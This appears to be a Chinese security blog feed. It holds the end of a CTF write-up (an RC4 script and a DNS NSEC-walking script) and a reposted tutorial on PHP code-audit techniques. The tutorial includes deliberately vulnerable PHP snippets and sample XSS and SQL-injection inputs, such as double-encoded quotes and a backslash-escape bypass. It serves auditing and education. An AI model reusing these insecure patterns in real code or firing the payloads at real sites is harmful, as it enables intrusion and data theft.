class="number">256</span></div><div class="line">    j=(j+s[i])%<span class="number">256</span></div><div class="line">    s[i],s[j]=s[j],s[i]</div><div class="line">    out.append(chr(ord(char)^s[(s[i]+s[j])%<span class="number">256</span>]))</div><div class="line">  <span class="keyword">return</span> <span class="string">''</span>.join(out)</div><div class="line">encodedata=rc4(<span class="string">'\xCA\xEE\x86\x30\x48\xC4\xEC\x56\x3D\x22\x2A\xBC\x9A\x95\x70\x23\x39\x76\x3B\xEE\x09\x29\x2B\x01\x54\x00\x87\x5E\x37\x23\x3E\x79\x8B\x7B\xA9\x20\x78'</span>,<span class="string">'hello world'</span>)</div><div class="line"><span class="keyword">print</span> encodedata</div></pre></td></tr></table></figure><h3 id="DNS-101"><a href="#DNS-101" class="headerlink" title="DNS 101"></a>DNS 101</h3><p>这个题我是懵逼了一上午，dig了一早上TXT没想到玄机在与NSEC(DNSSEC 的一部分 — 用来验证一个未存在的服务器，使用与 NXT（已过时）记录的格式)。还有一点就是dig any的用法，这个当时也是没有考虑到。（多谢rebirth的指点）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"></div><div class="line">target = <span class="string">'what.is.my.flag.src.edu-info.edu.cn'</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">  output = subprocess.Popen([<span class="string">'dig any'</span>+<span class="string">' '</span>+target],stdout=subprocess.PIPE,shell=<span class="keyword">True</span>).communicate()</div><div class="line"></div><div class="line">  <span class="comment">#print output[0]</span></div><div class="line"></div><div class="line">  result = re.findall(<span class="string">".*NSEC(.*). TXT.*"</span>,output[<span class="number">0</span>])</div><div class="line"></div><div class="line">  <span class="keyword">print</span> result[<span class="number">0</span>].strip()</div><div class="line"></div><div class="line">  target = result[<span class="number">0</span>].strip()</div><div class="line"></div><div class="line">  flag = subprocess.Popen([<span class="string">'dig'</span>+<span class="string">' '</span>+target+<span class="string">' '</span>+<span class="string">'TXT'</span>],stdout=subprocess.PIPE,shell=<span class="keyword">True</span>).communicate()</div><div class="line">  <span class="comment">#EIS&#123;&#125;是flag的格式</span></div><div class="line">  <span class="keyword">if</span> <span class="string">'EIS'</span> <span class="keyword">in</span> flag[<span class="number">0</span>]:</div><div class="line">    <span class="keyword">print</span> flag[<span class="number">0</span>]</div><div class="line">    <span class="keyword">break</span></div></pre></td></tr></table></figure><p>最终结果：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-02%20%E4%B8%8B%E5%8D%889.23.28.png" alt="屏幕快照 2017-11-02 下午9.23.28"></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>[转载]高级PHP应用程序漏洞审核技术</title>
      <link href="/2017/10/31/%E8%BD%AC%E8%BD%BD-%E9%AB%98%E7%BA%A7PHP%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%AE%A1%E6%A0%B8%E6%8A%80%E6%9C%AF/"/>
      <url>/2017/10/31/%E8%BD%AC%E8%BD%BD-%E9%AB%98%E7%BA%A7PHP%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%AE%A1%E6%A0%B8%E6%8A%80%E6%9C%AF/</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。</p><p>随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。针对这样一个状况，很多应用程序的官方都成立了安全部门，或者雇佣安全人员进行代码审计，因此出现了很多自动化商业化的代码审计工具。</p><p>也就是这样的形势导致了一个局面：大公司的产品安全系数大大的提高，那些很明显的漏洞基本灭绝了，那些大家都知道的审计技术都无用武之地了。我们面对很多工具以及大牛扫描过n遍的代码，有很多的安全人员有点悲观，而有的官方安全人员也非常的放心自己的代码，但是不要忘记了“没有绝对的安全”，我们应该去寻找新的途径挖掘新的漏洞。本文就给介绍了一些非传统的技术经验和大家分享。</p><p>另外在这里特别说明一下本文里面很多漏洞都是来源于网络上牛人和朋友们的分享，在这里需要感谢他们 ：）</p><h3 id="传统的代码审计技术"><a href="#传统的代码审计技术" class="headerlink" title="传统的代码审计技术"></a>传统的代码审计技术</h3><p>WEB应用程序漏洞查找基本上是围绕两个元素展开：变量与函数。也就是说一漏洞的利用必须把你提交的恶意代码通过变量经过n次变量转换传递，最终传递给目标函数执行，还记得MS那句经典的名言吗？“一切输入都是有害的”。这句话只强调了变量输入，很多程序员把“输入”理解为只是gpc<code>[</code>$<code>_</code>GET,$<code>_</code>POST,$<code>_</code>COOKIE<code>]</code>，但是变量在传递过程产生了n多的变化。导致很多过滤只是个“纸老虎”！我们换句话来描叙下代码安全：“一切进入函数的变量是有害的”。</p><p>PHP代码审计技术用的最多也是目前的主力方法：静态分析，主要也是通过查找容易导致安全漏洞的危险函数，常用的如grep，findstr等搜索工具，很多自动化工具也是使用正则来搜索这些函数。下面列举一些常用的函数，也就是下文说的字典（暂略）。但是目前基本已有的字典很难找到漏洞，所以我们需要扩展我们的字典，这些字典也是本文主要探讨的。</p><p>其他的方法有：通过修改PHP源代码来分析变量流程，或者hook危险的函数来实现对应用程序代码的审核，但是这些也依靠了我们上面提到的字典。</p><h3 id="PHP版本与应用代码审计"><a href="#PHP版本与应用代码审计" class="headerlink" title="PHP版本与应用代码审计"></a>PHP版本与应用代码审计</h3><p>到目前为止，PHP主要有3个版本：php4、php5、php6，使用比例大致如下：</p><table><thead><tr><th style="text-align:left">版本</th><th style="text-align:left">占比</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">php4</td><td style="text-align:left">68%</td><td style="text-align:left">2000-2007，No security fixes after 2008/08，最终版本是php4.4.9</td></tr><tr><td style="text-align:left">php5</td><td style="text-align:left">32%</td><td style="text-align:left">2004-present，Now at version 5.2.6（PHP 5.3 alpha1 released!）</td></tr><tr><td style="text-align:left">php6</td><td style="text-align:left"></td><td style="text-align:left">目前还在测试阶段，变化很多做了大量的修改，取消了很多安全选项如magic_quotes_gpc</td></tr></tbody></table><p>由于php缺少自动升级的机制，导致目前PHP版本并存，也导致很多存在漏洞没有被修补。这些有漏洞的函数也是我们进行WEB应用程序代码审计的重点对象，也是我们字典重要来源。</p><h3 id="其他的因素与应用代码审计"><a href="#其他的因素与应用代码审计" class="headerlink" title="其他的因素与应用代码审计"></a>其他的因素与应用代码审计</h3><p>很多代码审计者拿到代码就看，他们忽视了“安全是一个整体”，代码安全很多的其他因素有关系，比如上面我们谈到的PHP版本的问题，比较重要的还有操作系统类型（主要是两大阵营win/<code>*</code>nix），WEB服务端软件（主要是iis/apache两大类型）等因素。这是由于不同的系统不同的WEB SERVER有着不同的安全特点或特性，下文有些部分会涉及。</p><p>所以我们在做某个公司WEB应用代码审计时，应该了解他们使用的系统，WEB服务端软件，PHP版本等信息。</p><h3 id="扩展我们的字典"><a href="#扩展我们的字典" class="headerlink" title="扩展我们的字典"></a>扩展我们的字典</h3><p>下面将详细介绍一些非传统PHP应用代码审计一些漏洞类型和利用技巧。</p><h3 id="变量本身的key"><a href="#变量本身的key" class="headerlink" title="变量本身的key"></a>变量本身的key</h3><hr><p>说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的程序把变量本身的key也当变量提取给函数处理。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//key.php?aaaa'aaa=1&amp;bb'b=2 </span></div><div class="line"><span class="comment">//print_R($_GET); </span></div><div class="line"> <span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</div><div class="line">&#123;</div><div class="line"><span class="keyword">print</span> $key.<span class="string">"\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>上面的代码就提取了变量本身的key显示出来，单纯对于上面的代码，如果我们提交URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">key.php?&lt;script&gt;alert(1);&lt;/script&gt;=1&amp;bbb=2</div></pre></td></tr></table></figure><p>那么就导致一个xss的漏洞，扩展一下如果这个key提交给include()等函数或者sql查询呢？：） </p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求 : 无</td></tr><tr><td style="text-align:left">系统要求 : 无</td></tr><tr><td style="text-align:left">审计策略 : 通读代码</td></tr></tbody></table><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><hr><p>很多的漏洞查找者都知道extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖，但是还有很多其他情况导致变量覆盖的如：</p><h3 id="遍历初始化变量"><a href="#遍历初始化变量" class="headerlink" title="遍历初始化变量"></a>遍历初始化变量</h3><p>请看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//var.php?a=fuck</span></div><div class="line">$a=<span class="string">'hi'</span>;</div><div class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</div><div class="line">$$key = $value;</div><div class="line">&#125;</div><div class="line"><span class="keyword">print</span> $a;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>很多的WEB应用都使用上面的方式（注意循环不一定是foreach），如Discuz!4.1的WAP部分的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$chs = <span class="string">''</span>;</div><div class="line"><span class="keyword">if</span>($_POST &amp;&amp; $charset != <span class="string">'utf-8'</span>) &#123;</div><div class="line">$chs = <span class="keyword">new</span> Chinese(<span class="string">'UTF-8'</span>, $charset);</div><div class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value) &#123;</div><div class="line">$$key = $chs-&gt;Convert($value);</div><div class="line">&#125;</div><div class="line"><span class="keyword">unset</span>($chs);</div></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：通读代码</td></tr></tbody></table><h3 id="parse-str-变量覆盖漏洞"><a href="#parse-str-变量覆盖漏洞" class="headerlink" title="parse_str()变量覆盖漏洞"></a>parse_str()变量覆盖漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//var.php?var=new</span></div><div class="line">$var = <span class="string">'init'</span>;                     </div><div class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]); </div><div class="line"><span class="keyword">print</span> $var;</div></pre></td></tr></table></figure><p>该函数一样可以覆盖数组变量，上面的代码是通过$<code>_</code>SERVER[‘QUERY_STRING’]来提取变量的，对于指定了变量名的我们可以通过注射“=”来实现覆盖其他的变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//var.php?var=1&amp;a[1]=var1%3d222</span></div><div class="line">$var1 = <span class="string">'init'</span>;</div><div class="line">parse_str($a[$_GET[<span class="string">'var'</span>]]);</div><div class="line"><span class="keyword">print</span> $var1;</div></pre></td></tr></table></figure><p>上面的代码通过提交$var来实现对$var1的覆盖。</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略（parse_str）</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找字符parse_str</td></tr></tbody></table><table><thead><tr><th style="text-align:left"><em>漏洞审计策略（mb_parse_str）</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：php4&lt;4.4.7 php5&lt;5.2.2</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找字符mb_parse_str</td></tr></tbody></table><h3 id="import-request-variables-变量覆盖漏洞"><a href="#import-request-variables-变量覆盖漏洞" class="headerlink" title="import_request_variables()变量覆盖漏洞"></a>import_request_variables()变量覆盖漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//var.php?_SERVER[REMOTE_ADDR]=10.1.1.1</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'GLOBALS '</span>.(int)ini_get(<span class="string">"register_globals"</span>).<span class="string">"n"</span>;</div><div class="line">import_request_variables(<span class="string">'GPC'</span>);</div><div class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'10.1.1.1'</span>) <span class="keyword">die</span>(<span class="string">'Go away!'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'Hello admin!'</span>;</div></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略（import_request_variables）</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：php4&lt;4.4.1 php5&lt;5.2.2</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找字符import_request_variables</td></tr></tbody></table><h3 id="PHP5-Globals"><a href="#PHP5-Globals" class="headerlink" title="PHP5 Globals"></a>PHP5 Globals</h3><p>从严格意义上来说这个不可以算是PHP的漏洞，只能算是一个特性，测试代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//register_globals = &apos;ON&apos;</div><div class="line">//foo.php?GLOBALS[foobar]=HELLO</div><div class="line">echo $foobar; </div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>但是很多的程序没有考虑到这点，请看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//为了安全取消全局变量</span></div><div class="line"><span class="comment">//var.php?GLOBALS[a]=aaaa&amp;b=111</span></div><div class="line"><span class="keyword">if</span> (ini_get(<span class="string">'register_globals'</span>)) <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $k=&gt;$v) <span class="keyword">unset</span>($&#123;$k&#125;);</div><div class="line"><span class="keyword">print</span> $a;</div><div class="line"><span class="keyword">print</span> $_GET[b];</div></pre></td></tr></table></figure><p>如果熟悉WEB2.0的攻击的同学，很容易想到上面的代码我们可以利用这个特性进行crsf攻击。</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：通读代码</td></tr></tbody></table><h3 id="magic-quotes-gpc与代码安全"><a href="#magic-quotes-gpc与代码安全" class="headerlink" title="magic_quotes_gpc与代码安全"></a>magic_quotes_gpc与代码安全</h3><hr><h3 id="什么是magic-quotes-gpc"><a href="#什么是magic-quotes-gpc" class="headerlink" title="什么是magic_quotes_gpc"></a>什么是magic_quotes_gpc</h3><p>当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。还有很多函数有类似的作用 如：addslashes()、mysql_escape_string()、mysql_real_escape_string()等，另外还有parse_str()后的变量也受magic_quotes_gpc的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全。很多漏洞查找者或者工具遇到些函数过滤后的变量直接就放弃，但是就在他们放弃的同时也放过很多致命的安全漏洞。 ：）</p><h3 id="哪些地方没有魔术引号的保护"><a href="#哪些地方没有魔术引号的保护" class="headerlink" title="哪些地方没有魔术引号的保护"></a>哪些地方没有魔术引号的保护</h3><p><em>1) $<code>_</code>SERVER变量</em></p><p>PHP5的$<code>_</code>SERVER变量缺少magic_quotes_gpc的保护，导致近年来X-Forwarded-For的漏洞猛暴，所以很多程序员考虑过滤X-Forwarded-For，但是其他的变量呢？</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略（$<code>_</code>SERVER变量）</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找字符<code>_</code>SERVER</td></tr></tbody></table><p><em>2) getenv()得到的变量（使用类似$<code>_</code>SERVER变量）</em></p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略（getenv()）</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找字符getenv</td></tr></tbody></table><p><em>3) $HTTP_RAW_POST_DATA与PHP输入、输出流</em></p><p>主要应用与soap/xmlrpc/webpublish功能里，请看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>( $HTTP_RAW_POST_DATA ) ) &#123;</div><div class="line">$HTTP_RAW_POST_DATA = file_get_contents( <span class="string">'php://input'</span> );</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>($HTTP_RAW_POST_DATA) )</div><div class="line">$HTTP_RAW_POST_DATA = trim($HTTP_RAW_POST_DATA);</div></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略（数据流）</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找字符HTTP_RAW_POST_DATA或者php://input</td></tr></tbody></table><p><em>4) 数据库操作容易忘记’的地方如：in()/limit/order by/group by</em></p><p>如Discuz!&lt;5.0的pm.php：<br>​     </p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(is_array($msgtobuddys)) &#123;</div><div class="line">$msgto = array_merge($msgtobuddys, <span class="keyword">array</span>($msgtoid));</div><div class="line">......</div><div class="line"><span class="keyword">foreach</span>($msgto <span class="keyword">as</span> $uid) &#123;</div><div class="line">$uids .= $comma.$uid;</div><div class="line">$comma = <span class="string">','</span>;</div><div class="line">&#125;</div><div class="line">......</div><div class="line">$query = $db-&gt;query(<span class="string">"SELECT m.username, mf.ignorepm FROM &#123;$tablepre&#125;members m</span></div><div class="line">LEFT JOIN &#123;$tablepre&#125;memberfields mf USING(uid)</div><div class="line">WHERE m.uid IN ($uids)");</div></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找数据库操作字符（select,update,insert等等）</td></tr></tbody></table><h3 id="变量的编码与解码"><a href="#变量的编码与解码" class="headerlink" title="变量的编码与解码"></a>变量的编码与解码</h3><p>一个WEB程序很多功能的实现都需要变量的编码解码，而且就在这一转一解的传递过程中就悄悄的绕过你的过滤的安全防线。</p><p>这个类型的主要函数有：</p><p><em>1) stripslashes() 这个其实就是一个decode-addslashes()</em></p><p><em>2) 其他字符串转换函数：</em></p><table><thead><tr><th style="text-align:left">函数</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">base64_decode</td><td style="text-align:left">对使用 MIME base64 编码的数据进行解码</td></tr><tr><td style="text-align:left">base64_encode</td><td style="text-align:left">使用 MIME base64 对数据进行编码</td></tr><tr><td style="text-align:left">rawurldecode</td><td style="text-align:left">对已编码的 URL 字符串进行解码</td></tr><tr><td style="text-align:left">rawurlencode</td><td style="text-align:left">按照 RFC 1738 对 URL 进行编码</td></tr><tr><td style="text-align:left">urldecode</td><td style="text-align:left">解码已编码的 URL 字符串</td></tr><tr><td style="text-align:left">urlencode</td><td style="text-align:left">编码 URL 字符串</td></tr></tbody></table><p><em>另外一个 unserialize/serialize</em></p><p><em>3) 字符集函数（GKB,UTF7/8…）如iconv()/mb_convert_encoding()等</em></p><p>目前很多漏洞挖掘者开始注意这一类型的漏洞了，如典型的urldecode：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = <span class="string">"SELECT * FROM article WHERE articleid='"</span>.urldecode($_GET[id]).<span class="string">"'"</span>;</div></pre></td></tr></table></figure><p>当magic_quotes_gpc=on时，我们提交?id=%2527，得到sql语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM article WHERE articleid=<span class="string">''</span><span class="string">'</span></div></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找对应的编码函数</td></tr></tbody></table><h3 id="二次攻击"><a href="#二次攻击" class="headerlink" title="二次攻击"></a>二次攻击</h3><p><em>详细见附录 [1]</em></p><p><em>1) 数据库出来的变量没有进行过滤</em></p><p><em>2) 数据库的转义符号：</em></p><ul><li>mysql/oracle转义符号同样是\（我们提交’通过魔术引号变化为\’，当我们update进入数据库时，通过转义变为’）</li><li>mssql的转义字符为’（所以我们提交’通过魔术引号变化为\’，mssql会把它当为一个字符串直接处理，所以魔术引号对于mssql的注射没有任何意义）</li></ul><p>从这里我们可以思考得到一个结论：一切进入函数的变量都是有害的，另外利用二次攻击我们可以实现一个webrootkit，把我们的恶意构造直接放到数据库里。我们应当把这样的代码看成一个vul？</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：通读代码</td></tr></tbody></table><h3 id="魔术引号带来的新的安全问题"><a href="#魔术引号带来的新的安全问题" class="headerlink" title="魔术引号带来的新的安全问题"></a>魔术引号带来的新的安全问题</h3><p>首先我们看下魔术引号的处理机制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[\--&gt;\\,&apos;--&gt;\&apos;,&quot;--&gt;\&quot;,null--&gt;\0]</div></pre></td></tr></table></figure><p>这给我们引进了一个非常有用的符号“\”，“\”符号不仅仅是转义符号，在WIN系统下也是目录转跳的符号。这个特点可能导致php应用程序里产生非常有意思的漏洞：</p><p><em>1)得到原字符（’,\,”,null]）</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$order_sn=substr($_GET[<span class="string">'order_sn'</span>], <span class="number">1</span>);</div><div class="line"></div><div class="line"><span class="comment">//提交                 '</span></div><div class="line"><span class="comment">//魔术引号处理         \'</span></div><div class="line"><span class="comment">//substr               '</span></div><div class="line"></div><div class="line">$sql = <span class="string">"SELECT order_id, order_status, shipping_status, pay_status, "</span>.</div><div class="line">   <span class="string">" shipping_time, shipping_id, invoice_no, user_id "</span>.</div><div class="line">   <span class="string">" FROM "</span> . $ecs-&gt;table(<span class="string">'order_info'</span>).</div><div class="line">   <span class="string">" WHERE order_sn = '$order_sn' LIMIT 1"</span>;</div></pre></td></tr></table></figure><p><em>2)得到“\”字符</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$order_sn=substr($_GET[<span class="string">'order_sn'</span>], <span class="number">0</span>,<span class="number">1</span>);</div><div class="line"></div><div class="line"><span class="comment">//提交                 '</span></div><div class="line"><span class="comment">//魔术引号处理         \'</span></div><div class="line"><span class="comment">//substr               \    </span></div><div class="line"></div><div class="line">$sql = <span class="string">"SELECT order_id, order_status, shipping_status, pay_status, "</span>.</div><div class="line">   <span class="string">" shipping_time, shipping_id, invoice_no, user_id "</span>.</div><div class="line">   <span class="string">" FROM "</span> . $ecs-&gt;table(<span class="string">'order_info'</span>).</div><div class="line">   <span class="string">" WHERE order_sn = '$order_sn' and order_tn='"</span>.$_GET[<span class="string">'order_tn'</span>].<span class="string">"'"</span>;</div></pre></td></tr></table></figure><p>提交内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?order_sn=&apos;&amp;order_tn=%20and%201=1/*</div></pre></td></tr></table></figure><p>执行的SQL语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> order_id, order_status, shipping_status, pay_status, shipping_time, </div><div class="line">shipping_id, invoice_no, user_id <span class="keyword">FROM</span> order_info <span class="keyword">WHERE</span> order_sn = <span class="string">'\' and </span></div><div class="line">order_tn=' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">/*'</span></div></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找字符串处理函数如substr或者通读代码</td></tr></tbody></table><h3 id="变量key与魔术引号"><a href="#变量key与魔术引号" class="headerlink" title="变量key与魔术引号"></a>变量key与魔术引号</h3><p>我们最在这一节的开头就提到了变量key，PHP的魔术引号对它有什么影响呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//key.php?aaaa'aaa=1&amp;bb'b=2 </span></div><div class="line"><span class="comment">//print_R($_GET); </span></div><div class="line"> <span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</div><div class="line">        &#123;</div><div class="line">        <span class="keyword">print</span> $key.<span class="string">"\n"</span>;</div><div class="line">        &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><em>1)当magic_quotes_gpc = On时，在php5.24下测试显示：</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">aaaa\<span class="string">'aaa</span></div><div class="line">bb\'b</div></pre></td></tr></table></figure><p>从上面结果可以看出来，在设置了magic_quotes_gpc = On下，变量key受魔术引号影响。但是在php4和php&lt;5.2.1的版本中，不处理数组第一维变量的key，测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//key.php?aaaa'aaa[bb']=1 </span></div><div class="line">print_R($_GET); </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>结果显示:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">Array</span> ( [aaaa<span class="string">'aaa] =&gt; Array ( [bb\'] =&gt; 1 ) 